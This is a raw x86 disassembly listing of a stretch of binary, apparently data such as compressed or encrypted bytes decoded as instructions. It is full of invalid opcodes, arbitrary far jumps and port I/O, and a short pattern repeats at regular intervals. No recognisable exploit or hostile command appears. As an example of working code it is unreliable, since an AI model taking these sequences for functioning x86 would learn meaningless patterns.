  4273e8:	adc    al,0x23
  4273ea:	pop    ds
  4273eb:	sbb    edi,DWORD PTR [edx+0xc1]
	...
  427455:	add    BYTE PTR [edx],dl
  427457:	sbb    eax,0xaf3f8832
  42745c:	mov    edx,0x29f0389f
  427461:	sbb    esp,DWORD PTR [ebx+0x671d9fe0]
  427467:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427468:	add    DWORD PTR [eax],eax
  42746a:	add    BYTE PTR [ecx],al
  42746c:	add    BYTE PTR [eax],al
  42746e:	pop    esi
  42746f:	cmp    DWORD PTR [edi+0x24b79ed0],eax
  427475:	adc    DWORD PTR [ebp+0x58a4b1f8],ebx
  42747b:	pop    eax
  42747c:	xchg   edi,ebp
  42747e:	inc    ebx
  42747f:	leave  
  427480:	lahf   
  427481:	xchg   ebp,eax
  427482:	adc    eax,DWORD PTR [esi+0x55]
  427485:	fnstsw WORD PTR [ecx]
  427487:	jbe    0x4274d2
  427489:	jb     0x4274dd
  42748b:	retf   0xc7c3
  42748e:	call   0x9dd5:0x32a44fb2
  427495:	jne    0x4274f6
  427497:	mov    cl,0x44
  427499:	ficom  DWORD PTR [ecx]
  42749b:	shr    BYTE PTR [eax],1
  42749d:	inc    ecx
  42749e:	ja     0x42746b
  4274a0:	push   edx
  4274a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4274a2:	xchg   ebp,eax
  4274a3:	(bad)  
  4274a4:	ficomp DWORD PTR [ecx]
  4274a6:	gs sub eax,0x44353f34
  4274ac:	int3   
  4274ad:	sub    BYTE PTR [esp+ecx*2],ch
  4274b0:	sub    ch,ch
  4274b2:	mov    eax,0x81b09cfd
  4274b7:	std    
  4274b8:	mov    cl,0xec
  4274ba:	xchg   ecx,eax
  4274bb:	xchg   DWORD PTR [ebx-0x28387a5c],ebx
  4274c1:	xor    al,0xfb
  4274c3:	not    BYTE PTR [esi]
  4274c5:	js     0x42744a
  4274c7:	cmp    eax,0x2c4df912
  4274cc:	ins    DWORD PTR es:[edi],dx
  4274cd:	sbb    al,0x22
  4274cf:	xor    dh,dl
  4274d1:	pop    edi
  4274d2:	aam    0xd2
  4274d4:	je     0x427544
  4274d6:	dec    ebp
  4274d7:	out    dx,al
  4274d8:	outs   dx,BYTE PTR ds:[esi]
  4274d9:	pushf  
  4274da:	sahf   
  4274db:	(bad)  
  4274dc:	pop    ebx
  4274dd:	mov    edx,0xacab85aa
  4274e2:	sbb    DWORD PTR [edx],edi
  4274e4:	sti    
  4274e5:	xor    eax,0xc31aef3a
  4274ea:	lock les edi,FWORD PTR [ebx-0x2a]
  4274ee:	jnp    0x42756f
  4274f0:	loopne 0x427477
  4274f2:	mov    ch,0x14
  4274f4:	and    al,0x82
  4274f6:	je     0x427484
  4274f8:	pop    esi
  4274f9:	sub    DWORD PTR [eax],edi
  4274fb:	out    0xc3,al
  4274fd:	push   esp
  4274fe:	mov    al,ds:0x65e867af
  427503:	cwde   
  427504:	sbb    cl,BYTE PTR [ebx]
  427506:	ins    DWORD PTR es:[edi],dx
  427507:	dec    edi
  427508:	fwait
  427509:	cld    
  42750a:	stos   BYTE PTR es:[edi],al
  42750b:	dec    esp
  42750c:	sbb    esi,DWORD PTR [ebp+0x58]
  42750f:	pop    esp
  427510:	retf   0xafa
  427513:	in     al,0xe7
  427515:	inc    ecx
  427516:	call   0xa836:0x452068ff
  42751d:	test   BYTE PTR [eax+0x5267195c],0xe0
  427524:	ja     0x42751a
  427526:	and    DWORD PTR [ebx-0x44b1a6a4],ebp
  42752c:	mov    edx,0xde67fc1a
  427531:	cmp    BYTE PTR [edi-0x6],bl
  427534:	dec    ecx
  427535:	push   cs
  427536:	and    al,0x6d
  427538:	push   es
  427539:	ficomp WORD PTR [esi]
  42753b:	adc    dl,BYTE PTR [esi+0x5a879a7]
  427541:	xchg   edx,eax
  427542:	arpl   WORD PTR [ebx+0x3a87fc81],ax
  427548:	and    edx,DWORD PTR [eax+0x2798b914]
  42754e:	xor    cl,BYTE PTR [ecx+ebp*1]
  427551:	jp     0x4274ff
  427553:	inc    eax
  427554:	out    dx,al
  427555:	fmul   st,st(3)
  427557:	popa   
  427558:	and    ebp,DWORD PTR [edi]
  42755a:	add    DWORD PTR [edx+0x43aee3ef],esp
  427560:	sub    BYTE PTR [eax+0x64af97f8],bh
  427566:	sub    al,0xa6
  427568:	inc    edx
  427569:	pushf  
  42756a:	xchg   edi,eax
  42756b:	push   esp
  42756c:	mov    edi,0xaf
	...
  4275d5:	add    BYTE PTR [eax+ebp*4-0x40],bl
  4275d9:	stos   DWORD PTR es:[edi],eax
  4275da:	hlt    
  4275db:	jmp    0x42765c
  4275dd:	(bad)  
  4275de:	cmp    dh,BYTE PTR [esi]
  4275e0:	jbe    0x42764c
  4275e2:	or     dh,bh
  4275e4:	and    ecx,DWORD PTR [edi]
  4275e6:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  4275e8:	add    DWORD PTR [eax],eax
  4275ea:	add    BYTE PTR [ecx],al
  4275ec:	add    BYTE PTR [eax],al
  4275ee:	sub    bl,cl
  4275f0:	push   eax
  4275f1:	mov    ebx,0x60edde1d
  4275f6:	mov    ebp,0xdb5c93c9
  4275fb:	test   eax,0xb81106c5
  427600:	dec    edx
  427601:	popw   ds
  427603:	pop    edi
  427604:	dec    eax
  427605:	add    DWORD PTR [edi+0xc833ec1],edi
  42760b:	xor    DWORD PTR [edx-0x720bf9bc],esp
  427611:	adc    al,0x22
  427613:	pop    es
  427614:	stc    
  427615:	fmul   QWORD PTR [ebx-0x4775e26d]
  42761b:	xchg   esp,eax
  42761c:	pop    es
  42761d:	or     cl,BYTE PTR [ecx+0x44]
  427620:	push   esi
  427621:	data16 loope 0x427619
  427624:	push   0x5
  427626:	iret   
  427627:	(bad)  
  427628:	jb     0x42769a
  42762a:	cmp    al,0xd8
  42762d:	dec    ecx
  42762e:	push   eax
  42762f:	cmp    al,0xec
  427631:	ret    0x7c37
  427634:	dec    eax
  427635:	jmp    0x8a3b:0xdc3b43b2
  42763c:	aam    0x23
  42763e:	push   cs
  42763f:	lods   eax,DWORD PTR ds:[esi]
  427640:	xchg   esp,eax
  427641:	sahf   
  427642:	mov    edi,0x196b13bd
  427647:	enter  0x26c4,0x54
  42764b:	mov    edi,DWORD PTR [eax-0x49]
  42764e:	mov    ecx,0xa3c1194d
  427653:	sub    ebp,ecx
  427655:	sub    BYTE PTR [ecx-0x66],0x54
  427659:	into   
  42765a:	and    eax,0xb2639a0e
  42765f:	(bad)  
  427660:	(bad)  
  427661:	and    eax,0x3bf0e902
  427666:	mov    bl,al
  427668:	repz dec eax
  42766a:	dec    esp
  42766b:	mov    al,ds:0x343d2880
  427670:	mov    ah,0xb4
  427672:	jmp    DWORD PTR [edx+0x4a]
  427675:	and    bl,BYTE PTR [edx]
  427677:	cmp    al,0x5a
  427679:	or     al,0x2d
  42767b:	jnp    0x42762f
  42767d:	fcmovbe st,st(7)
  42767f:	lods   al,BYTE PTR ds:[esi]
  427680:	dec    ebx
  427681:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427682:	sub    ecx,DWORD PTR [esi+0x6a]
  427685:	retf   0xf941
  427688:	inc    esi
  427689:	or     ebx,edx
  42768b:	mov    edx,0xa5f740e1
  427690:	enter  0xa853,0xe4
  427694:	pop    edx
  427695:	mov    ebx,0x164f6074
  42769a:	mov    eax,ds:0x171df3f0
  42769f:	pop    esi
  4276a0:	push   0xe3fe032a
  4276a5:	and    al,0x7f
  4276a7:	cmp    DWORD PTR [edx-0x25],0x39
  4276ab:	shl    DWORD PTR [ebp-0x499a22e],cl
  4276b1:	and    dh,BYTE PTR [eax+0x7f]
  4276b4:	dec    edx
  4276b5:	stos   DWORD PTR es:[edi],eax
  4276b6:	cli    
  4276b7:	sbb    BYTE PTR [ebp+0x6a],bl
  4276ba:	cmp    al,0xf6
  4276bc:	cmp    DWORD PTR [ebp+0x4a0ce0f],edx
  4276c2:	mov    ebp,0xeeac94ca
  4276c7:	mov    ebx,0xa4249b74
  4276cc:	das    
  4276cd:	les    ebp,FWORD PTR [esi]
  4276cf:	out    dx,al
  4276d0:	jmp    0x1c235298
  4276d5:	and    dh,BYTE PTR [eax-0x33965cbc]
  4276db:	loopne 0x42766a
  4276dd:	add    BYTE PTR [ecx+0x55],0x7
  4276e1:	adc    DWORD PTR [edx+0x68],0x2142aba2
  4276e8:	adc    eax,0x7883580
  4276ed:	cwde   
	...
  427756:	add    DWORD PTR [esi-0x70],edx
  427759:	out    dx,al
  42775a:	xlat   BYTE PTR ds:[ebx]
  42775b:	out    dx,al
  42775c:	jg     0x42775d
  42775e:	in     al,dx
  42775f:	xor    al,0x86
  427761:	(bad)  [ebx]
  427763:	daa    
  427764:	ror    DWORD PTR [edi+0x67],cl
  427767:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427768:	add    DWORD PTR [eax],eax
  42776a:	add    BYTE PTR [ecx],al
  42776c:	add    BYTE PTR [eax],al
  42776e:	sahf   
  42776f:	rcl    DWORD PTR [eiz*2+0x3e6bae13],1
  427776:	mov    DWORD PTR [edx-0x6],edx
  427779:	lds    edi,FWORD PTR fs:[esi]
  42777c:	xchg   esp,eax
  42777d:	sub    dl,BYTE PTR [esi]
  42777f:	jle    0x427739
  427781:	mov    WORD PTR [ebp-0x6150df91],gs
  427787:	or     DWORD PTR [esp+ebp*2],edx
  42778a:	xor    cl,BYTE PTR [ebx-0x27]
  42778d:	mov    ecx,0x8c675b37
  427792:	shl    al,1
  427794:	fwait
  427795:	retf   0x634b
  427798:	mov    ds:0xe1aac9b3,al
  42779d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42779e:	or     ch,BYTE PTR [edi]
  4277a0:	or     esp,esi
  4277a2:	loope  0x42775e
  4277a4:	mov    ch,BYTE PTR [ecx+0x22]
  4277a7:	xchg   esi,eax
  4277a8:	sub    edx,DWORD PTR [edi-0xf4ccbd3]
  4277ae:	fisttp WORD PTR [ebx-0x2b]
  4277b1:	cmp    eax,0xe00a92d8
  4277b6:	adc    eax,ecx
  4277b8:	fsubp  st(7),st
  4277ba:	lahf   
  4277bb:	enter  0xc4f4,0xd0
  4277bf:	pop    ebx
  4277c0:	mov    al,0xb7
  4277c2:	nop
  4277c3:	ret    
  4277c4:	xlat   BYTE PTR ds:[ebx]
  4277c5:	mov    bh,0xae
  4277c7:	dec    ebx
  4277c8:	jmp    0xe834:0x28e72a0f
  4277cf:	adc    BYTE PTR [esi-0x7a],al
  4277d2:	pushf  
  4277d3:	pop    ebx
  4277d4:	clc    
  4277d5:	ret    
  4277d6:	dec    ebx
  4277d7:	inc    esp
  4277d8:	sti    
  4277d9:	mov    edx,0x31cfad0e
  4277de:	test   BYTE PTR [ebx-0x25],bl
  4277e1:	jl     0x4277a7
  4277e3:	sbb    al,0x4d
  4277e5:	jmp    0xbd5:0x4a09d1d1
  4277ec:	enter  0xe1e0,0x90
  4277f0:	or     ah,BYTE PTR [eax+0x45]
  4277f3:	jae    0x4277c4
  4277f5:	push   esi
  4277f6:	fcomp  QWORD PTR [ebp+0x70bdf2e6]
  4277fc:	dec    edx
  4277fd:	scas   eax,DWORD PTR es:[edi]
  4277fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4277ff:	adc    BYTE PTR [esi+0x7158dc5b],dh
  427805:	mov    al,0x45
  427807:	adc    edx,esi
  427809:	adc    dh,BYTE PTR ds:0x73955f8e
  42780f:	mov    ds:0x970bdd81,eax
  427814:	pop    edi
  427815:	mov    ebx,0x379cce04
  42781a:	fs hlt 
  42781c:	mov    cl,BYTE PTR [esi]
  42781e:	add    BYTE PTR [ecx-0x60],0x8a
  427822:	push   0x74
  427824:	inc    eax
  427825:	xchg   DWORD PTR ds:0x81e40bd3,ecx
  42782b:	sbb    bh,BYTE PTR [ebx+0x55]
  42782e:	call   0x7ca5:0xf6ab3a3b
  427835:	sub    eax,DWORD PTR [esi-0x72771b84]
  42783b:	mov    ecx,0x9879f9e9
  427840:	inc    ebp
  427841:	add    bl,BYTE PTR [edi-0xe]
  427844:	inc    ebp
  427845:	fyl2xp1 
  427847:	xlat   BYTE PTR ds:[ebx]
  427848:	repnz sbb DWORD PTR ds:0x24403275,esp
  42784f:	imul   ebx,DWORD PTR [edx+0x2f],0x86621999
  427856:	int    0x18
  427858:	in     eax,dx
  427859:	push   esi
  42785a:	enter  0x62d5,0x7b
  42785e:	ror    ebx,cl
  427860:	xchg   esp,eax
  427861:	leavew 
  427863:	sub    dh,bl
  427865:	adc    dh,BYTE PTR [ecx+0x19f1b114]
  42786b:	add    cl,0xfe
	...
  4278d6:	sbb    cl,BYTE PTR [edx-0x3a64baf5]
  4278dc:	pop    esi
  4278dd:	fbstp  TBYTE PTR [eax+0x65]
  4278e0:	fldl2e 
  4278e2:	cmp    ebx,DWORD PTR [edx]
  4278e4:	jae    0x427871
  4278e6:	addr16 test al,0x1
  4278e9:	add    BYTE PTR [eax],al
  4278eb:	add    DWORD PTR [eax],eax
  4278ed:	add    ah,bl
  4278ef:	fisubr WORD PTR [edx-0x38]
  4278f2:	retf   
  4278f3:	call   0x8b37:0xdf67504a
  4278fa:	pusha  
  4278fb:	cwde   
  4278fc:	ds hlt 
  4278fe:	ins    BYTE PTR es:[edi],dx
  4278ff:	mov    dl,0x3b
  427901:	sti    
  427902:	rcr    BYTE PTR [eax-0x42de83d0],1
  427908:	ja     0x427951
  42790a:	adc    DWORD PTR [ebp-0x299fd3eb],0x1b63181a
  427914:	out    0xc6,al
  427916:	test   al,0x54
  427918:	fdiv   st,st(2)
  42791a:	jle    0x42796d
  42791c:	xchg   edi,eax
  42791d:	dec    ebp
  42791e:	aaa    
  42791f:	fidivr DWORD PTR [eax]
  427921:	jb     0x427997
  427923:	int    0x50
  427925:	aas    
  427926:	call   0xc3b49027
  42792b:	xchg   ebp,eax
  42792c:	aam    0x7a
  42792e:	cmp    DWORD PTR [ebx-0x74f4c7be],0x913bdde1
  427938:	icebp  
  427939:	(bad)  
  42793a:	fidivr DWORD PTR [edx-0x47]
  42793d:	mov    ebx,0x250d1aad
  427942:	sub    DWORD PTR ds:0x8e00fa86,edx
  427948:	test   BYTE PTR [esi],bl
  42794a:	jg     0x427949
  42794c:	or     ch,BYTE PTR [ebx-0x79b4c417]
  427952:	dec    edi
  427953:	fimul  DWORD PTR [edi+edi*2]
  427956:	rol    BYTE PTR [esi+ecx*2+0x4e5a1e17],cl
  42795d:	repnz int 0xce
  427960:	icebp  
  427961:	sahf   
  427962:	and    cl,cl
  427964:	aad    0x5e
  427966:	loope  0x42798d
  427968:	lock or edx,edx
  42796b:	jbe    0x4279eb
  42796d:	mov    al,ds:0x8c807c10
  427972:	stos   DWORD PTR es:[edi],eax
  427973:	test   eax,0x8582a08d
  427978:	sub    DWORD PTR [esi+0x7],esi
  42797b:	inc    esi
  42797c:	sub    BYTE PTR [ecx],al
  42797e:	jecxz  0x4279f4
  427980:	rcl    DWORD PTR [esp+edi*8-0x3491511c],1
  427987:	jg     0x42798a
  427989:	push   esi
  42798a:	mov    al,0x7e
  42798c:	fsub   DWORD PTR [edi-0x2e08409d]
  427992:	(bad)  
  427993:	(bad)  
  427994:	sahf   
  427995:	stos   BYTE PTR es:[edi],al
  427996:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427997:	inc    ebp
  427998:	stc    
  427999:	bsf    edi,esp
  42799c:	mov    cl,0x8e
  42799e:	mov    WORD PTR [eax-0x4c],ss
  4279a1:	dec    ebx
  4279a2:	pushf  
  4279a3:	sbb    DWORD PTR [ebx-0x6f],0x8bcdb717
  4279aa:	lahf   
  4279ab:	stos   DWORD PTR es:[edi],eax
  4279ac:	jne    0x427930
  4279ae:	sar    BYTE PTR [ecx],cl
  4279b0:	je     0x427994
  4279b2:	popf   
  4279b3:	adc    DWORD PTR [eax-0x2481e4c7],ecx
  4279b9:	iret   
  4279ba:	push   ebp
  4279bb:	loope  0x4279f3
  4279bd:	xchg   BYTE PTR [ecx],cl
  4279bf:	mov    cl,0x44
  4279c1:	sahf   
  4279c2:	jbe    0x427a36
  4279c4:	mov    ah,0x8d
  4279c6:	stos   DWORD PTR es:[edi],eax
  4279c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4279c8:	or     ebp,ecx
  4279ca:	dec    esi
  4279cb:	adc    eax,0x7df95703
  4279d0:	add    DWORD PTR [esi-0x2b],0x28
  4279d4:	mov    edx,0x9dce0926
  4279d9:	hlt    
  4279da:	into   
  4279db:	das    
  4279dc:	push   eax
  4279dd:	cmp    BYTE PTR [eax+0x2f511c46],0xc
  4279e4:	jmp    0x4279be
  4279e6:	mov    ebp,0x5d5592ea
  4279eb:	es (bad) 
	...
  427a56:	call   0xdea3:0xffa3ffdd
  427a5d:	std    
  427a5e:	inc    edx
  427a5f:	jne    0x427a39
  427a61:	sbb    esi,0x52
  427a64:	adc    al,0xfe
  427a66:	addr16 test eax,0x1000001
  427a6c:	add    BYTE PTR [eax],al
  427a6e:	mov    eax,0xdd3d1d9f
  427a73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427a74:	cdq    
  427a75:	std    
  427a76:	imul   eax,edi,0x1f
  427a79:	jns    0x427a10
  427a7b:	push   edi
  427a7c:	jle    0x427a04
  427a7e:	pop    esi
  427a7f:	and    al,0x92
  427a81:	sbb    ch,cl
  427a83:	xchg   ecx,eax
  427a84:	std    
  427a85:	pop    edx
  427a86:	cmp    BYTE PTR [ebp+ebp*8+0x3f],ch
  427a8a:	or     ebp,DWORD PTR [esi]
  427a8c:	jne    0x427a5b
  427a8e:	lock jno 0x427a6a
  427a91:	push   ss
  427a92:	adc    eax,0x886d91c1
  427a97:	mov    ch,0x3
  427a99:	dec    al
  427a9b:	cs std 
  427a9d:	fcom   st(1)
  427a9f:	in     eax,0xaf
  427aa1:	jmp    0x8316:0xdeca1dd6
  427aa8:	sub    eax,0x65afe040
  427aad:	(bad)  
  427aae:	mov    eax,0x1bfe76ab
  427ab3:	xchg   ebp,eax
  427ab4:	dec    edx
  427ab5:	pop    ebp
  427ab6:	lds    esi,FWORD PTR [edx-0x33]
  427ab9:	sub    DWORD PTR [edi],0xf0dd7751
  427abf:	inc    ecx
  427ac0:	loop   0x427b0b
  427ac2:	psraw  mm3,QWORD PTR [ecx-0x5c]
  427ac6:	and    al,0x43
  427ac8:	imul   ecx,DWORD PTR [esi-0x72],0xc88057a0
  427acf:	mov    ebx,0x2868d51c
  427ad4:	push   eax
  427ad5:	mov    dl,0x2e
  427ad7:	and    edx,DWORD PTR [edx+0x9]
  427ada:	rcr    BYTE PTR ds:0xe26aaba9,1
  427ae0:	sahf   
  427ae1:	fild   WORD PTR [eax-0xc]
  427ae4:	mov    bh,0x4b
  427ae6:	dec    DWORD PTR [edx]
  427ae8:	lock stos DWORD PTR es:[edi],eax
  427aea:	lock push ecx
  427aec:	sbb    edi,DWORD PTR [edi]
  427aee:	lahf   
  427aef:	outs   dx,DWORD PTR ds:[esi]
  427af0:	(bad)  
  427af1:	mov    ecx,0xf74fb805
  427af6:	mov    ds:0xf417bc81,eax
  427afb:	mov    edi,0x5cc3d3ca
  427b00:	enter  0x562,0x88
  427b04:	xor    BYTE PTR [ebx],dh
  427b06:	or     eax,0x79a6de27
  427b0b:	add    eax,0xfe912c37
  427b10:	outs   dx,BYTE PTR ds:[esi]
  427b11:	xchg   edi,eax
  427b12:	sub    eax,0x4b764d1c
  427b17:	jns    0x427b8b
  427b19:	in     eax,dx
  427b1a:	into   
  427b1b:	push   ss
  427b1c:	jb     0x427b61
  427b1e:	mov    eax,ds:0xc4ecb214
  427b23:	fdivr  st(6),st
  427b25:	fstp   DWORD PTR [edi-0x4b]
  427b28:	fst    DWORD PTR [bx]
  427b2b:	mov    DWORD PTR ds:0xd7c758f7,edi
  427b31:	jae    0x427b91
  427b33:	jg     0x427b8b
  427b35:	adc    DWORD PTR [ebp+0x7766654e],edi
  427b3b:	push   0x6eeac63
  427b40:	mov    al,ds:0x9845480c
  427b45:	cmp    eax,0xffb30781
  427b4a:	pop    ss
  427b4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427b4c:	mov    ebp,0x53bcf525
  427b51:	sti    
  427b52:	test   eax,0xbfa17710
  427b57:	sub    ebp,esp
  427b59:	xchg   ebx,eax
  427b5a:	fcomp  QWORD PTR [edi]
  427b5c:	xor    ebp,DWORD PTR [edx+0x7b102365]
  427b62:	mov    DWORD PTR [ecx+0x72],ebx
  427b65:	popa   
  427b66:	retf   
  427b67:	mov    ds:0xce69b778,al
  427b6c:	push   es
  427b6d:	jmp    0x427b6f
	...
  427bd3:	add    BYTE PTR [eax],al
  427bd5:	add    dl,cl
  427bd7:	mov    edx,DWORD PTR [edx+0x7b]
  427bda:	push   ebx
  427bdb:	sti    
  427bdc:	jmp    0x427b99
  427bde:	push   ecx
  427bdf:	mov    ecx,ebx
  427be1:	test   BYTE PTR [ebx+0x36],0x4c
  427be5:	arpl   WORD PTR [edi-0x56],sp
  427be8:	add    DWORD PTR [eax],eax
  427bea:	add    BYTE PTR [ecx],al
  427bec:	add    BYTE PTR [eax],al
  427bee:	lods   al,BYTE PTR ds:[esi]
  427bef:	fdivr  DWORD PTR [ebx-0x79428bf2]
  427bf5:	push   edx
  427bf6:	ins    BYTE PTR es:[edi],dx
  427bf7:	outs   dx,BYTE PTR ds:[esi]
  427bf8:	mov    eax,0x4f3042ec
  427bfd:	mov    eax,0x6eab0185
  427c02:	fstp   DWORD PTR [esp+edi*2+0x35]
  427c06:	fsubr  DWORD PTR [edx-0xb8debff]
  427c0c:	das    
  427c0d:	retf   
  427c0e:	jp     0x427bc3
  427c10:	xchg   BYTE PTR [eax+0x3e46f229],cl
  427c16:	fwait
  427c17:	mov    ebp,0x90e9294f
  427c1c:	iret   
  427c1d:	lods   al,BYTE PTR ds:[esi]
  427c1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427c1f:	(bad)  
  427c20:	test   eax,0x69231aa6
  427c25:	dec    edx
  427c26:	int3   
  427c27:	ds pop ebp
  427c29:	imul   edi,ebp,0x7f
  427c2c:	push   0x77
  427c2e:	xor    eax,0xc392faa9
  427c33:	adc    DWORD PTR [esi],esp
  427c35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427c36:	cmp    edi,DWORD PTR [edi+0x6010a7cd]
  427c3c:	nop
  427c3d:	add    BYTE PTR [ecx*4-0x3f728b31],dh
  427c44:	or     BYTE PTR [edi],ah
  427c46:	jle    0x427bd8
  427c48:	mov    dl,0x4c
  427c4a:	ficomp DWORD PTR [ebx]
  427c4c:	rol    BYTE PTR [esi],0xec
  427c4f:	xchg   DWORD PTR [eax-0x6c],eax
  427c52:	jo     0x427bf3
  427c54:	cmp    al,dl
  427c56:	cdq    
  427c57:	inc    ecx
  427c58:	mov    esi,0xee825ce5
  427c5d:	pushf  
  427c5e:	and    eax,0x504acdf8
  427c63:	test   DWORD PTR [edi-0x8],0xd738235d
  427c6a:	and    ah,dh
  427c6c:	sbb    esi,ecx
  427c6e:	in     al,0x73
  427c70:	data16 ss icebp 
  427c73:	mov    esi,DWORD PTR [edx+0x2b]
  427c76:	adc    al,0xf1
  427c78:	add    al,BYTE PTR [eax+ebx*1+0x3c47cbe2]
  427c7f:	cli    
  427c80:	aam    0xa5
  427c82:	pop    ds
  427c83:	test   DWORD PTR [ebx-0x60],edi
  427c86:	test   DWORD PTR [esi-0xea3f042],esi
  427c8c:	xchg   ebx,eax
  427c8d:	xchg   edi,eax
  427c8e:	mov    eax,ds:0x657fe524
  427c93:	daa    
  427c94:	dec    edi
  427c95:	mov    ebx,0x622db3ae
  427c9a:	jae    0x427d13
  427c9c:	mov    bl,0xf8
  427c9e:	aaa    
  427c9f:	mov    esp,0x62e87950
  427ca4:	(bad)  
  427ca6:	sbb    BYTE PTR [edx+0x2272744e],0x80
  427cad:	mov    ebx,0x4e6b3d14
  427cb2:	cmp    ch,BYTE PTR ds:0x944b
  427cb7:	cld    
  427cb8:	xlat   BYTE PTR ds:[ebx]
  427cb9:	in     eax,dx
  427cba:	fidivr DWORD PTR [ecx+eiz*4]
  427cbd:	jmp    0x9d91b34b
  427cc2:	mov    ebx,0xd91e12d0
  427cc7:	pop    DWORD PTR [ebx]
  427cc9:	add    al,0x19
  427ccb:	gs js  0x427cf0
  427cce:	loope  0x427caa
  427cd0:	lds    edi,FWORD PTR [edx+0x50]
  427cd3:	arpl   di,bp
  427cd5:	dec    edx
  427cd6:	jp     0x427ca4
  427cd8:	call   0x22eb:0x20227865
  427cdf:	cs lahf 
  427ce1:	xor    BYTE PTR [edx],bh
  427ce3:	and    ecx,0x4
  427ce6:	or     al,BYTE PTR [eax]
  427ce8:	enter  0xa113,0xd2
  427cec:	aad    0x9e
	...
  427d56:	mov    ds:0xf343b050,eax
  427d5b:	jecxz  0x427d50
  427d5d:	lock xchg DWORD PTR ds:0xeedd5d44,ebx
  427d64:	loop   0x427d91
  427d66:	stos   DWORD PTR es:[di],eax
  427d68:	add    DWORD PTR [eax],eax
  427d6a:	add    BYTE PTR [ecx],al
  427d6c:	add    BYTE PTR [eax],al
  427d6e:	shl    DWORD PTR [ebx-0x4f],0xde
  427d72:	bound  ebp,QWORD PTR [ecx+0x12dcc5ee]
  427d78:	std    
  427d79:	push   ebx
  427d7a:	adc    al,0xfa
  427d7c:	call   0xef66f3d3
  427d81:	stos   DWORD PTR es:[edi],eax
  427d82:	not    DWORD PTR [esi-0xb7acf5b]
  427d88:	add    BYTE PTR [ecx-0x74],bh
  427d8b:	xchg   esp,eax
  427d8c:	xor    esi,DWORD PTR [ecx]
  427d8e:	mov    ebp,0x95db13f3
  427d93:	cs mov edi,0xbe7dcf9f
  427d99:	icebp  
  427d9a:	mov    ebx,0xd234e53d
  427d9f:	test   al,0x90
  427da1:	neg    BYTE PTR [eax+ebx*8-0x1b]
  427da5:	pop    edx
  427da6:	jnp    0x427e19
  427da8:	jl     0x427dc2
  427daa:	sti    
  427dab:	xchg   ebp,eax
  427dac:	aam    0x2b
  427dae:	dec    edx
  427daf:	jl     0x427d95
  427db1:	pusha  
  427db2:	jmp    0x10a9:0xdfa4ce
  427db9:	mov    ch,0xf3
  427dbb:	leave  
  427dbc:	sub    esi,DWORD PTR [ebp-0x43267b58]
  427dc2:	mov    ebx,0xd6c81f63
  427dc7:	nop
  427dc8:	xchg   ebx,eax
  427dc9:	xchg   esi,eax
  427dca:	repnz cmp bl,BYTE PTR [ebx-0x25f55a28]
  427dd1:	ss ret 0x350a
  427dd5:	mov    esi,0xc330bd7a
  427dda:	ds daa 
  427ddc:	mov    ds:0x3e51299a,al
  427de1:	ins    DWORD PTR es:[edi],dx
  427de2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427de3:	jno    0x427d98
  427de5:	ret    0x1da9
  427de8:	adc    bh,BYTE PTR [eax+0x4b9e0807]
  427dee:	push   0x60
  427df0:	dec    ecx
  427df1:	rol    BYTE PTR [ecx+0x2bf398d0],cl
  427df7:	test   DWORD PTR [esi],0x9929522c
  427dfd:	test   eax,0xdd0aea7e
  427e02:	jmp    0xe7a3cd02
  427e07:	sub    ecx,DWORD PTR [eax-0x39afa3ad]
  427e0d:	xchg   edi,eax
  427e0e:	dec    ecx
  427e0f:	repz mov esi,0x447e2057
  427e15:	hlt    
  427e16:	pop    ebp
  427e17:	js     0x427e72
  427e19:	mov    eax,ds:0x94169ad9
  427e1e:	fmul   DWORD PTR [edx+eiz*8-0x45]
  427e22:	js     0x427dc6
  427e24:	sbb    BYTE PTR [eax],ch
  427e26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427e27:	in     al,dx
  427e28:	adc    DWORD PTR [edx-0x66f8bacd],ecx
  427e2e:	imul   edx,ebx,0x21942a7f
  427e34:	pop    esp
  427e35:	int3   
  427e36:	jne    0x427e01
  427e38:	jb     0x427e19
  427e3a:	lds    edi,FWORD PTR [ebx-0x1b]
  427e3d:	sub    eax,0xdba290ac
  427e42:	(bad)  
  427e43:	fwait
  427e44:	lea    ebx,[ecx-0x2c]
  427e47:	(bad)  
  427e48:	scas   eax,DWORD PTR es:[edi]
  427e49:	xchg   BYTE PTR [ebp+0x2b],dl
  427e4c:	mov    ecx,DWORD PTR [edx-0x6b]
  427e4f:	inc    ecx
  427e50:	sar    BYTE PTR [edx+esi*4],0x1f
  427e54:	adc    BYTE PTR [ebp+0x4c],dh
  427e57:	sbb    DWORD PTR [ebp+0x72e572fe],0x54
  427e5e:	sbb    ebx,DWORD PTR [ebp-0x2e7b0f58]
  427e64:	push   es
  427e65:	sub    DWORD PTR [esi+edi*4],eax
  427e68:	jo     0x427e33
  427e6a:	pusha  
  427e6b:	and    ebx,DWORD PTR [ecx+0x83]
	...
  427ed5:	add    BYTE PTR [eax+0x6d3c25f1],bh
  427edb:	cld    
  427edc:	mov    ecx,0x2bc293f5
  427ee1:	leave  
  427ee2:	outs   dx,BYTE PTR ds:[esi]
  427ee3:	jo     0x427ee9
  427ee5:	xlat   BYTE PTR ds:[ebx]
  427ee6:	lods   al,BYTE PTR ds:[si]
  427ee8:	add    DWORD PTR [eax],eax
  427eea:	add    BYTE PTR [ecx],al
  427eec:	add    BYTE PTR [eax],al
  427eee:	inc    edi
  427eef:	sub    al,0x7c
  427ef1:	out    dx,al
  427ef2:	in     eax,0x73
  427ef4:	mov    dh,0xbf
  427ef6:	dec    esi
  427ef7:	or     al,BYTE PTR [esi]
  427ef9:	dec    dh
  427efb:	cmp    DWORD PTR [ecx],ebp
  427efd:	xchg   BYTE PTR [eax],dl
  427eff:	imul   edi,esi,0x56
